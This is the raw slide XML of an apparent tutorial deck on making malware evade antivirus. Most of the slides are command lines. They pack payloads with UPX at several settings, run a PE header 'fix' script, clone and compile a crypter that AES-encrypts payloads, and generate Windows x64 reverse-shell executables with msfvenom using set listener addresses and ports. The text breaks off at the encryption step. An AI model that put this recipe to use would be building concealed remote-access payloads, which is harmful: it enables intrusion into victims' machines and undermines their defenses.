            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Part 3 Advanced:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Packers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> (like UPX) or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>Crypters</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> to wrap the payload. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Part 3: Packers (UPX) &amp; Header Modification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>1. Pack encoded payload with UPX (maximum compression)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>upx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> --best --ultra-brute encoded_payload.exe -o packed_payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>upx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -o payload_upx_std.exe payload_fixed.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>If these commands show error then follow this guidance </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="it-IT" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>nano fix_pe_aggressive.py</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="45E719"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AC857003-04F7-DF02-A1CC-749C5B420526}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5307344" y="126268"/>
            <a:ext cx="6884656" cy="6605463"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>And then paste this code </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/fix_pe_aggressive.py</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Run it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>python3 fix_pe_aggressive.py your_file.exe</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>RUN IT python3 fix_pe_aggressive.py  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>upx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -o payload_upx_std.exe payload_fixed.exe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Now it will be succeeded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>2. Pack with UPX standard: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" kern="100" dirty="0" err="1">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upx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900"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 -o payload_upx_std.exe payload_raw.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3. Pack with UPX extreme: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" kern="100" dirty="0" err="1">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upx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900"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 --best -o payload_upx_best.exe payload_raw.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>4. Pack with UPX LZMA: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" kern="100" dirty="0" err="1">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upx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900"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1900" kern="100" dirty="0" err="1">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lzma</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900"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 -o payload_upx_lzma.exe payload_raw.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>5. Unpack UPX: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" kern="100" dirty="0" err="1">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upx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900"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 -d payload_upx_std.exe -o payload_unpacked.exe</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2011796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866549-27D7-A71D-4171-7399AC981425}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="92365" y="-242742"/>
            <a:ext cx="12007269" cy="6970113"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> decay88 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>crypter</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> (AES128 Encryption)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 1: Install dependencies</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>apt-get update</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>apt-get install mingw-w64 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>libssl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-dev</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 2: Clone and compile the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>crypter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="45E719"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>git clone https://github.com/decay88/JoeCrypter.git &amp;&amp; cd </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>crypter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="45E719"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gcc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>crypter.c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>crypter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>lcrypto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -I </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 3: Generate raw shellcode with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="45E719"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -p windows/x64/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shell_reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> LHOST=192.168.1.10 LPORT=4444 -f raw -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>payload.bin</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="45E719"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Or</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -p windows/x64/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>shell_reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> LHOST=192.168.1.193 LPORT=4443 -f exe -o payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 4: Encrypt the payload with the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>crypter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="45E719"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>./</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>crypter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
